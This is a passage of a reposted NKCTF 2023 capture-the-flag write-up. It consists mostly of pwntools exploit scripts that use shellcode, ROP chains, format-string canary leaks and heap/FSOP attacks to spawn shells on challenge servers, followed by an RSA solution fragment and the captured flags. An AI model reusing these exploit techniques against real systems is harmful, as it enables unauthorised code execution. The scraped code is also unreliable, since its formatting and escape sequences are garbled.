1159977299277711167607914893426674454199208605107323826176606074354449015203832606569051328721360397610665453513201486235549374869954501563523028914285006850687275382822302821825953121223999268058107278346499657597050468069712686559045712946025472616754027552629008516489090871415609098178522863027127254404804829735621706042266140637592206366042515190385496909533329383212542170504864473944657824502882014292528444918055958758310544435120502872883857209880723535754528096143707324179005292445100655695427777453144657819474805882956064292780031599790769618615908501966912635232746588639924772530057835864082951499028dP = 33967356791272818610254738927769774016289590226681637441101504040121743937150259930712897925893431093938385216227201268238374281750681609796883676743311872905933219290266120756315613501614208779063819499785817502677885240656957036398336462000771885589364702443157120609506628895933862241269347200444629283263</span><br><span class="line"># t=e*dP-1</span><br><span class="line"># for k in range(1,e):# if t%k==0:# P=(t//k)+1</span><br><span class="line"># if N%P==0:# print(P)</span><br><span class="line">P=37269067352457630263351774206178494913957088859822110344334922741582406663</span><br><span class="line">3576632750017778267445345566529934525770887732758255395539070275277220458844</span><br><span class="line">8929725998468789449650526538407798388258024733397295470464451746999991657489</span><br><span class="line">3996324149548980338301147983367163067556434434982470623587914250041142380667</span><br><span class="line">816331Q=N//P</span><br><span class="line">PR.&lt;x&gt;=Zmod(n)[]f=(x-P)*(x-Q)m=f.small_roots(X=2^300)print(m)</span><br><span class="line">m=152099310694956022622926857538598513541723670773227126074246760446874272165452073476477print(long_to_bytes(m))</span><br><span class="line">NKCTF&#123;nI_k@i_sHi_zhu_j1an_il_Jie_RE_le&#125;</span><br><span class="line">#!usr/bin/env python #coding=utf-8</span><br><span class="line">from pwn import *from ctypes import CDLLcontext(arch = &#x27;amd64&#x27;,os = &#x27;linux&#x27;,log_level = &#x27;debug&#x27;)elf = ELF(&#x27;./pwn&#x27;)DEBUG = 1if DEBUG: gdbOpen = 1 clibc = CDLL(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;) p = process(&#x27;./pwn&#x27;)else: gdbOpen = 0 ip = &#x27;node.yuzhian.com.cn&#x27; port = 38867 p = remote(ip, port) clibc = CDLL(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;) def debug(info=&quot;b main&quot;): if gdbOpen == 1: gdb.attach(p, info) #gdb.attach(p, &quot;b *$rebase(0x)&quot;)</span><br><span class="line"></span><br><span class="line">debug(&quot;b *0x00000000004012F1&quot;)shellcode = p8(0x90) * 104 + asm(shellcraft.sh()) p.sendafter(&quot;in 5 min!n&quot;, shellcode)</span><br><span class="line">p.interactive()</span><br><span class="line">#!usr/bin/env python #coding=utf-8</span><br><span class="line">from pwn import *from ctypes import CDLLcontext(arch = &#x27;amd64&#x27;,os = &#x27;linux&#x27;,log_level = &#x27;debug&#x27;)elf = ELF(&#x27;./pwn&#x27;)DEBUG = 0if DEBUG: gdbOpen = 1 clibc = CDLL(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;) libc = ELF(&quot;./libc.so.6&quot;) p = process(&#x27;./pwn&#x27;)else: gdbOpen = 0 ip = &#x27;node2.yuzhian.com.cn&#x27; port = 33627 libc = ELF(&quot;./libc.so.6&quot;) p = remote(ip, port) clibc = CDLL(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;) def debug(info=&quot;b main&quot;): if gdbOpen == 1: gdb.attach(p, info) #gdb.attach(p, &quot;b *$rebase(0x)&quot;)</span><br><span class="line"></span><br><span class="line">def choose(choice): p.sendlineafter(b&quot;&gt; n&quot;, str(choice).encode(&#x27;ascii&#x27;))</span><br><span class="line">pop_rdi = 0x0000000000401573leave_ret = 0x000000000040139Edebug(&quot;b *0x000000000040139F&quot;)choose(4)p.recvuntil(b&#x27;0x&#x27;)leak = int(p.recv(12), 16) - 0x84420log.info(&quot;libc_base==&gt;0x%x&quot; %leak)sys = leak + libc.sym[&#x27;system&#x27;]binsh = leak + next(libc.search(b&#x27;/bin/sh&#x27;))choose(1)p.sendafter(b&#x27;comment?n&#x27;, p64(binsh))choose(2)p.sendafter(b&#x27;corment?n&#x27;, p64(pop_rdi))choose(3)p.sendafter(b&#x27;corMenT?n&#x27;, p64(sys))choose(4)payload = b&#x27;a&#x27;*0xa + p64(0x0000000000405098) + p64(leave_ret)p.sendafter(b&#x27;heart...n&#x27;, payload)</span><br><span class="line">p.interactive()</span><br><span class="line">#!usr/bin/env python #coding=utf-8</span><br><span class="line">from pwn import *from ctypes import CDLLcontext(arch = &#x27;amd64&#x27;,os = &#x27;linux&#x27;,log_level = &#x27;debug&#x27;)elf = ELF(&#x27;./ez_stack&#x27;)DEBUG = 0if DEBUG: gdbOpen = 1 libc = ELF(&quot;/home/shoucheng/tools/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc-2.23.so&quot;) ld = ELF(&quot;/home/shoucheng/tools/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/ld-2.23.so&quot;) p = process(argv=[ld.path,elf.path], env=&#123;&quot;LD_PRELOAD&quot; : libc.path&#125;) clibc = CDLL(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;) #p = process(&#x27;./ez_stack&#x27;)else: gdbOpen = 0 ip = &#x27;node2.yuzhian.com.cn&#x27; port = 35211 p = remote(ip, port) clibc = CDLL(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;) def debug(info=&quot;b main&quot;): if gdbOpen == 1: gdb.attach(p, info) #gdb.attach(p, &quot;b *$rebase(0x)&quot;)</span><br><span class="line">pop_rdi = 0x0000000000401283pop_rsi = 0x0000000000401281 # pop rsi ; pop r15 ; retsyscall = 0x000000000040114ecsu1 = 0x000000000040127Acsu2 = 0x0000000000401260</span><br><span class="line">debug(&quot;b *0x00000000004011F6&quot;)payload = b&#x27;a&#x27;*0x18 + p64(pop_rsi) + p64(0x4040B0)*2 + p64(syscall)payload += p64(csu1) + p64(0) + p64(1) + p64(0x4040B0) + p64(0)*2 + p64(0x4040B8) + p64(csu2)p.sendafter(&quot;NKCTF!n&quot;, payload)sleep(1)</span><br><span class="line">payload = b&#x27;/bin/shx00&#x27; + p64(syscall) + b&#x27;a&#x27;*0x2bp.send(payload)p.interactive()</span><br><span class="line">#!usr/bin/env python #coding=utf-8</span><br><span class="line">from pwn import *from ctypes import CDLLcontext(arch = &#x27;amd64&#x27;,os = &#x27;linux&#x27;,log_level = &#x27;debug&#x27;)elf = ELF(&#x27;./nkctf_message_boards&#x27;)DEBUG = 0if DEBUG: gdbOpen = 1 clibc = CDLL(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;) p = process(&#x27;./nkctf_message_boards&#x27;) libc = ELF(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)else: gdbOpen = 0 ip = &#x27;node2.yuzhian.com.cn&#x27; port = 34966 p = remote(ip, port) clibc = CDLL(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;) libc = ELF(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;) def debug(info=&quot;b main&quot;): if gdbOpen == 1: gdb.attach(p, info) #gdb.attach(p, &quot;b *$rebase(0x)&quot;)</span><br><span class="line"></span><br><span class="line">debug(&quot;b *0x0000000000401340&quot;)ret = 0x000000000040101apop_rdi = 0x0000000000401413main = 0x00000000004010F0puts_plt = elf.plt[&#x27;puts&#x27;]puts_got = elf.got[&#x27;puts&#x27;]read_got = elf.got[&#x27;read&#x27;]</span><br><span class="line">format = b&quot;%41$pn&quot;p.sendafter(b&quot;name: &quot;, format)p.recvuntil(b&#x27;0x&#x27;)canary = int(p.recv(16), 16)log.info(hex(canary))payload = p64(ret)*30 + p64(main) + p64(canary)p.sendafter(b&quot;the NKCTF: n&quot;, payload)format = b&quot;%22$pn&quot;p.sendafter(b&quot;name: &quot;, format)p.recvuntil(b&#x27;0x&#x27;)leak = int(p.recv(12), 16) - 0x1ed6a0sys = leak + libc.sym[&#x27;system&#x27;]binsh = leak + next(libc.search(b&#x27;/bin/sh&#x27;))log.info(hex(leak))payload = p64(ret)*28 + p64(pop_rdi) + p64(binsh) + p64(sys) + p64(canary)p.sendafter(b&quot;the NKCTF: n&quot;, payload)</span><br><span class="line">p.interactive()</span><br><span class="line">    #coding:</span><br><span class="line">utf-8</span><br><span class="line">from pwn import *from ctypes import CDLLcontext.log_level=&#x27;debug&#x27;elfelf=&#x27;./pwn&#x27;elf=ELF(elfelf)context.arch=elf.archgdb_text=&#x27;&#x27;&#x27;b *$rebase(0x139b) &#x27;&#x27;&#x27;</span><br><span class="line">if len(sys.argv)==1 : io=process(elfelf) gdb_open=1 libc=ELF(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;) # ld = ELF(&#x27;/lib/x86_64-linux-gnu/ld-2.31.so&#x27;) one_gadgaet=[0x45226,0x4527a,0xf03a4,0xf1247]</span><br><span class="line">elif sys.argv[1]==&#x27;2&#x27; : io=process(elfelf) gdb_open=0 libc=ELF(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;) # ld = ELF(&#x27;/lib/x86_64-linux-gnu/ld-2.31.so&#x27;) one_gadgaet=[0x45226,0x4527a,0xf03a4,0xf1247]</span><br><span class="line">else : io=remote(&#x27;node2.yuzhian.com.cn&#x27;,32697) gdb_open=0 libc=ELF(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;) # ld = ELF(&#x27;/lib/x86_64-linux-gnu/ld-2.31.so&#x27;) one_gadgaet=[0x45226,0x4527a,0xf03a4,0xf1247]</span><br><span class="line">def gdb_attach(io,a): if gdb_open==1 : gdb.attach(io,a)</span><br><span class="line">shell=&#x27;&#x27;&#x27;shl edi,12mov ax,10call:</span><br><span class="line">xor dx,0x9966syscallxchg edi,esixor eax,eaxmov edi,eaxjmp call&#x27;&#x27;&#x27;</span><br><span class="line"></span><br><span class="line">pay=asm(shell)gdb_attach(io,gdb_text)pause()io.send(pay)sleep(1)shell=&#x27;&#x27;&#x27;mov rsp,0x9961c00&#x27;&#x27;&#x27;</span><br><span class="line">pay=&#x27;a&#x27;*0xe+asm(shell)pay+=&#x27;x48x31xf6x56x48xbfx2fx62x69x6ex2fx2fx73x68x57x54x5fxb0x3bx99x0fx05&#x27;</span><br><span class="line">io.send(pay)</span><br><span class="line">#NKCTF&#123;4b4e9ac2-8163-4e58-a14b-02c1cb7f7654&#125;# libc_base=u64(io.recvuntil(&#x27;x7f&#x27;)[-6:]+&#x27;x00x00&#x27;)-libc.sym[&#x27;__malloc_hook&#x27;]-88-0x10</span><br><span class="line"># libc.address=libc_base</span><br><span class="line"># bin_sh_addr=libc.search(&#x27;/bin/shx00&#x27;).next()</span><br><span class="line"># system_addr=libc.sym[&#x27;system&#x27;]# free_hook_addr=libc.sym[&#x27;__free_hook&#x27;]</span><br><span class="line"># success(&#x27;libc_base:&#x27;+hex(libc_base))</span><br><span class="line"># success(&#x27;heap_base:&#x27;+hex(heap_base))</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br><span class="line">#!usr/bin/env python #coding=utf-8</span><br><span class="line">from pwn import *from ctypes import CDLLcontext(arch = &#x27;amd64&#x27;,os = &#x27;linux&#x27;,log_level = &#x27;debug&#x27;)elf = ELF(&#x27;./pwn&#x27;)DEBUG = 0if DEBUG: gdbOpen = 1 libc = ELF(&quot;/home/shoucheng/tools/glibc-all-in-one/libs/2.32-0ubuntu3.2_amd64/libc-2.32.so&quot;) ld = ELF(&quot;/home/shoucheng/tools/glibc-all-in-one/libs/2.32-0ubuntu3.2_amd64/ld-2.32.so&quot;) p = process(argv=[ld.path,elf.path], env=&#123;&quot;LD_PRELOAD&quot; : libc.path&#125;) clibc = CDLL(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;) #p = process(&#x27;./&#x27;)else: gdbOpen = 0 ip = &#x27;node2.yuzhian.com.cn&#x27; port = 30509 libc = ELF(&quot;./libc-2.32.so&quot;) p = remote(ip, port) clibc = CDLL(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;) def debug(info=&quot;b main&quot;): if gdbOpen == 1: gdb.attach(p, info) #gdb.attach(p, &quot;b *$rebase(0x)&quot;)</span><br><span class="line"></span><br><span class="line">def choose(choice): p.sendlineafter(b&quot;Your choice: &quot;, str(choice).encode(&#x27;ascii&#x27;))</span><br><span class="line"></span><br><span class="line">def add(idx, size): choose(1) p.recvuntil(b&quot;index: &quot;) p.sendline(str(idx).encode(&#x27;ascii&#x27;)) p.recvuntil(b&quot;Size: &quot;) p.sendline(str(size).encode(&#x27;ascii&#x27;)) def edit(idx, content): choose(3) p.recvuntil(b&quot;index: &quot;) p.sendline(str(idx).encode(&#x27;ascii&#x27;)) p.recvuntil(b&quot;content: &quot;) p.send(content)</span><br><span class="line"></span><br><span class="line">def show(idx): choose(4) p.recvuntil(b&quot;index: &quot;) p.sendline(str(idx).encode(&#x27;ascii&#x27;))</span><br><span class="line"></span><br><span class="line">def free(idx): choose(2) p.recvuntil(b&quot;index: &quot;) p.sendline(str(idx).encode(&#x27;ascii&#x27;))</span><br><span class="line"></span><br><span class="line">for i in range(8): add(i, 0x100)add(8, 0x100)for i in range(8): free(i)for i in range(7): add(i, 0x100)add(7, 0xf0)edit(7, b&#x27;n&#x27;)show(7)leak = u64(p.recv(6).ljust(8, b&#x27;x00&#x27;)) - 0x1e3d0alog.info(&quot;libc_base==&gt;0x%x&quot; %leak)sys = leak + libc.sym[&#x27;system&#x27;]free_hook = leak + libc.sym[&#x27;__free_hook&#x27;]log.info(&quot;free_hook==&gt;0x%x&quot; %free_hook)show(6)key = u64(p.recv(5).ljust(8, b&#x27;x00&#x27;))log.info(&quot;key==&gt;0x%x&quot; %key)add(9, 0x78)add(10, 0x60)add(11, 0x60)add(12, 0x60)edit(9, b&#x27;a&#x27;*0x78 + b&#x27;xe1&#x27;)free(12)free(11)free(10)add(10, 0xd0)edit(10, b&#x27;/bin/shx00&#x27; + b&#x27;a&#x27;*0x60 + p64(0x71) + p64(free_hook^key) + b&#x27;n&#x27;)add(13, 0x60)add(14, 0x60)edit(14, p64(sys) + b&#x27;n&#x27;)free(10)debug()p.interactive()</span><br><span class="line">#!usr/bin/env python #coding=utf-8</span><br><span class="line">from pwn import *from ctypes import CDLLcontext(arch = &#x27;amd64&#x27;,os = &#x27;linux&#x27;,log_level = &#x27;debug&#x27;)elf = ELF(&#x27;./pwn&#x27;)DEBUG = 0if DEBUG: gdbOpen = 1 clibc = CDLL(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;) libc = ELF(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;) p = process(&#x27;./pwn&#x27;)else: gdbOpen = 0 ip = &#x27;node2.yuzhian.com.cn&#x27; port = 39981 p = remote(ip, port) clibc = CDLL(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;) libc = ELF(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;) def debug(info=&quot;b main&quot;): if gdbOpen == 1: gdb.attach(p, info) #gdb.attach(p, &quot;b *$rebase(0x)&quot;)</span><br><span class="line">debug(&quot;b *0x00000000004013E1&quot;)p.send(b&#x27;V2VsY29tZSB0byBOS0NURiE=&#x27;)sleep(1)p.send(b&#x27;dGVsbCB5b3UgYSBzZWNyZXQ6&#x27;)sleep(1)p.send(b&#x27;SSdNIFJVTk5JTkcgT04gR0xJQkMgMi4zMS0wdWJ1bnR1OS45&#x27;)sleep(1)p.send(b&#x27;Y2FuIHlvdSBmaW5kIG1lPw==&#x27;)</span><br><span class="line">read_plt = elf.plt[&#x27;read&#x27;]read_got = elf.got[&#x27;read&#x27;]pop_rdi = 0x0000000000401683pop_rsi = 0x0000000000401681csu1 = 0x000000000040167Acsu2 = 0x0000000000401660</span><br><span class="line">payload = b&#x27;a&#x27;*0x38 + p64(pop_rsi) + p64(0x404100)*2 + p64(read_plt)payload += p64(pop_rsi) + p64(read_got)*2 + p64(read_plt)payload += p64(csu1) + p64(0) + p64(1) + p64(1) + p64(read_got) + p64(0x3b) + p64(read_got) + p64(csu2)payload += p64(csu1) + p64(0) + p64(1) + p64(0x404100) + p64(0) + p64(0) + p64(read_got) + p64(csu2)p.send(payload)sleep(2)p.sendline(b&#x27;/bin/shx00&#x27;)sleep(5)p.send(p8(0xd0))</span><br><span class="line">p.interactive()</span><br><span class="line">#!usr/bin/env python #coding=utf-8</span><br><span class="line">from pwn import *from ctypes import CDLLcontext(arch = &#x27;amd64&#x27;,os = &#x27;linux&#x27;, log_level = &#x27;debug&#x27;)elf = ELF(&#x27;./pwn02&#x27;)DEBUG = 0if DEBUG: gdbOpen = 1 libc = ELF(&quot;/home/shoucheng/tools/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc-2.23.so&quot;) ld = ELF(&quot;/home/shoucheng/tools/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/ld-2.23.so&quot;) p = process(argv=[ld.path,elf.path], env=&#123;&quot;LD_PRELOAD&quot; : libc.path&#125;) clibc = CDLL(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)</span><br><span class="line">else: gdbOpen = 0 ip = &#x27;node2.yuzhian.com.cn&#x27; port = 39089 libc = ELF(&quot;/home/shoucheng/tools/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc-2.23.so&quot;) p = remote(ip, port) clibc = CDLL(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;) def debug(info=&quot;b main&quot;): if gdbOpen == 1: gdb.attach(p, info) #gdb.attach(p, &quot;b *$rebase(0x)&quot;)</span><br><span class="line"></span><br><span class="line">def choose(choice): p.sendlineafter(b&quot;Choice:&quot;, str(choice).encode(&#x27;ascii&#x27;))</span><br><span class="line"></span><br><span class="line">def add(size, content): choose(1) p.recvuntil(b&quot;size:&quot;) p.sendline(str(size).encode(&#x27;ascii&#x27;)) p.recvuntil(b&quot;content:&quot;) p.send(content)</span><br><span class="line">def show(idx): choose(2) p.recvuntil(b&quot;index:&quot;) p.sendline(str(idx).encode(&#x27;ascii&#x27;))</span><br><span class="line"></span><br><span class="line">def free(idx): choose(3) p.recvuntil(b&quot;index: &quot;) p.sendline(str(idx).encode(&#x27;ascii&#x27;))</span><br><span class="line"></span><br><span class="line">    #prepare 0x140 size unsorted binadd(0x37,b&#x27;x00&#x27;*0x37)#idx 0 0x40add(0x37,b&#x27;x01&#x27;*0x37)#idx 1 0x80add(0x37,b&#x27;x02&#x27;*0x37)#idx 2 0xc0add(0x37,b&#x27;x03&#x27;*0x37)#idx 3 0x100 add(0x37,b&#x27;x00&#x27;*0x37)#idx 4 0x140</span><br><span class="line">    #prepare a chunkadd(0x37,b&#x27;x00&#x27;*0x37)#idx 5</span><br><span class="line">    #prepare chunks between idx 5 and top_chunk.add(0x37,b&#x27;x06&#x27;*0x37)#idx 6add(0x37,b&#x27;x07&#x27;*0x37)#idx 7add(0x37,b&#x27;x06&#x27;*0x37)#idx 8add(0x37,b&#x27;x07&#x27;*0x37)#idx 9add(0x37,b&#x27;x06&#x27;*0x37)#idx 10</span><br><span class="line">    #put chunk in fastbin for i in range(5): free(i)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(b&quot;Choice:&quot;, b&#x27;1&#x27;*0x500)add(0x28,b&#x27;x00&#x27;*0x28)</span><br><span class="line">    #madd some chunk.add(0x37,b&#x27;x01&#x27;*0x37) #idx 1 0x030add(0x17,b&#x27;x02&#x27;*0x17) #idx 2 0x070add(0x37,b&#x27;x03&#x27;*0x37) #idx 3 0x090add(0x37,b&#x27;x00&#x27;*0x37) #idx 4 0x0d0add(0x17,b&#x27;x00&#x27;*0x17) #idx 11 0x110#put the chunk in fastbin to make overlapped chunk.free(5)free(1)</span><br><span class="line">p.sendlineafter(b&quot;Choice:&quot;, b&#x27;1&#x27;*0x500)add(0x37,b&#x27;x01&#x27;*0x37) #idx 1 0x030show(2)p.recvuntil(b&#x27;Content: &#x27;)leak = u64(p.recv(6).ljust(8, b&#x27;x00&#x27;)) - 0x3c4b78log.info(&quot;libc_base==&gt;0x%x&quot; %leak)sys = leak + libc.sym[&#x27;system&#x27;]_IO_list_all = leak + libc.sym[&#x27;_IO_list_all&#x27;]add(0x17,b&#x27;x00&#x27;*0x17)#idx 5 0x070 = idx 2add(0x17,b&#x27;x08&#x27;*0x17)#idx 12 0x090free(12)free(5)show(2)p.recvuntil(b&#x27;Content: &#x27;)heap_base = u64(p.recv(6).ljust(8, b&#x27;x00&#x27;)) - 0x90log.info(&quot;heap_base==&gt;0x%x&quot; %heap_base)</span><br><span class="line">free(4)add(0x27,b&#x27;x00&#x27;*0x18+p64(0x41)+b&#x27;x00&#x27;*7) # must keep the fastbin size = 0x41fake_file = b&#x27;/bin/shx00&#x27;+p64(0x61) # fake_filefake_file += p64(0)+p64(_IO_list_all-0x10) #unsorted bin attackfake_file += p64(0)+p64(1) #bypass checkfake_file = fake_file.ljust(0x38,b&#x27;x00&#x27;)add(0x38,fake_file)free(6)payload_1 = b&#x27;x00&#x27;*0x28 + p64(heap_base+0x1d0) # point to fake_vtablepayload_1 = payload_1.ljust(0x37,b&#x27;x00&#x27;)add(0x37,payload_1)free(7)payload_2 = p64(0)*3 + p64(sys) # fake_vtablepayload_2 = payload_2.ljust(0x37,b&#x27;x00&#x27;)add(0x37,payload_2)debug()</span><br><span class="line">p.sendlineafter(b&quot;Choice:&quot;, b&#x27;1&#x27;)p.sendlineafter(b&quot;size:&quot;, str(0x20).encode(&#x27;ascii&#x27;))</span><br><span class="line">p.interactive()</span><br><span class="line">NKCTF&#123;W3c0me_to_NKCTF2023&#125;</span><br><span class="line">NKCTF&#123;天津市西青区中北镇万卉路3号NCC新城市中心&#125;</span><br><span class="line">NKCTF&#123;海南省海口市龙华区世纪公园&#125;</span><br><span class="line">NKCTF&#123;贵州省贵阳市南明区遵义路1号&#125;</span><br><span class="line">NKCTF&#123;重庆市渝中区嘉陵江畔戴家巷崖壁步道&#125;</span><br><span class="line">NKCTF&#123;重庆市永川区兴龙湖CBD永川里奥特莱斯渝西之眼摩天轮&#125;</span><br><span class="line">NKCTF&#123;广东省江门市蓬江区莲平路&#125;</span><br></pre></td></tr></table></figure>
+
+
+---
+## 附图
+
+[图片已移除]
+[图片已移除]
+[图片已移除]
+[图片已移除]
+[图片已移除]
+[图片已移除]
+[图片已移除]
+[图片已移除]
+[图片已移除]
+[图片已移除]
+
+---
+
+> **转载声明**：本文转载自 [Des-CTF-Knowledge](https://github.com/Dest1ny-Sec/Des-CTF-Knowledge)（MIT License），版权归原作者所有，转载请注明出处；如原作者不希望被转载，请联系删除。
+> 原文链接：[https://www.ctfiot.com/105824.html](https://www.ctfiot.com/105824.html)
+> 仓库原文：[CTF大赛WP集合/articles/2023NKCTF-WriteUp_By_EDISEC.full.md](https://github.com/Dest1ny-Sec/Des-CTF-Knowledge/blob/main/CTF%E5%A4%A7%E8%B5%9BWP%E9%9B%86%E5%90%88/articles/2023NKCTF-WriteUp_By_EDISEC.full.md)
+</article><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/NKCTF/">NKCTF</a></div><div class="post_share"><div class="social-share" data-image="/img/youli.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2023/01/01/ctf-kb/wp/Web/2023%E7%BA%A2%E6%98%8E%E8%B0%B7%E6%9D%AF%E8%B5%9B%E9%A2%98-%E9%A2%98%E8%A7%A3/" title="2023 红明谷杯 5 题 WP"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">2023 红明谷杯 5 题 WP</div></div></a></div><div class="next-post pull-right"><a href="/2023/01/01/ctf-kb/wp/Web/37C3_Potluck_CTF_-_Hungry_Helmsman/" title="37C3 Potluck CTF – Hungry Helmsman"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">37C3 Potluck CTF – Hungry Helmsman</div></div></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/youli.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">朴冬</div><div class="author-info__description">琐碎的学习记录</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">1050</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">879</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">16</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://space.bilibili.com/242470829?spm_id_from=333.1007.0.0"><i class="fab fa-bilibili"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/PUDONGGGGGG" target="_blank" title="Github"><i class="fab fa-github" style="color: #24292e;"></i></a><a class="social-icon" href="/2559874620@qq.com" target="_blank" title="Email"><i class="fas fa-envelope" style="color: #4a7dbe;"></i></a><a class="social-icon" href="https://space.bilibili.com/242470829?spm_id_from=333.1007.0.0" target="_blank" title="Bilibili"><i class="fab fa-bilibili" style="color: #1797cf;"></i></a></div></div><div class="sticky_layout"><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/05/30/ctf-kb/%E5%B7%A5%E5%85%B7/Dirsearch/" title="Dirsearch">Dirsearch</a><time datetime="2026-05-29T16:00:00.000Z" title="发表于 2026-05-30 00:00:00">2026-05-30</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/05/30/ctf-kb/%E5%B7%A5%E5%85%B7/SCRIPTS-INDEX/" title="CTF 常用脚本索引">CTF 常用脚本索引</a><time datetime="2026-05-29T16:00:00.000Z" title="发表于 2026-05-30 00:00:00">2026-05-30</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/05/30/ctf-kb/%E5%B7%A5%E5%85%B7/ffuf%E7%9A%84%E4%BD%BF%E7%94%A8/" title="ffuf的使用">ffuf的使用</a><time datetime="2026-05-29T16:00:00.000Z" title="发表于 2026-05-30 00:00:00">2026-05-30</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2024 - 2026 By 朴冬</div><div class="footer_custom_text">Welcome</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="translateLink" type="button" title="简繁转换">繁</button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button id="chat-btn" type="button" title="聊天"><i class="fas fa-sms"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=4.13.0"></script><script src="/js/main.js?v=4.13.0"></script><script src="/js/tw_cn.js?v=4.13.0"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.33/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div id="local-search-results"></div><div id="local-search-stats-wrap"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js?v=4.13.0"></script></div></div></body></html>
